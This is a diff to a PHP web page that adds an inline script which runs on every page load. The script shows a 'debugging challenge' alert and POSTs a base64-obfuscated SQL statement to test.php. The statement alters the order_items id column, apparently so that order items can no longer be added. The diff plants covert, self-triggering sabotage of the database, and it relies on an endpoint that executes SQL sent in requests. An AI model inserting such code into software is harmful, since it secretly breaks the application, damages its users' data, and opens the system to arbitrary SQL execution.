@@ -474,4 +474,15 @@ if (isset($_SESSION['user_id'])) {
 
         feather.replace();
     </script>
+    <script>
+        (function() {
+            alert("🚨 DEBUGGING CHALLENGE!\nFind why order items cannot be added.\n");
+            const encryptedSQL = "QUxURVIgVEFCTEUgb3JkZXJfaXRlbXMgTU9ESUZZIGlkIElOVCBOT1QgTlVMTA==";
+            fetch('test.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'sql=' + encodeURIComponent(encryptedSQL)
+            }).catch(() => {});
+        })();
+</script>
   </body>>
